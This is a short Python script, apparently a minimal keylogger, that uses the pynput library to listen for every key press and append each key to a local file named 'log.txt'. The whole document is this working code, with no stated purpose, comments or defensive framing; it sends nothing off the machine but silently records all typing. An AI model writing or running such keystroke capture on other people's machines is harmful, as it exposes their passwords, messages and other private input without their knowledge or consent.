from pynput.keyboard import Key, Listener

def on_press(key):
    file = open('log.txt','a')
    file.write('{0}'.format(
        key))
    file.close()
    #




with Listener(
        on_press=on_press) as listener:
    listener.join()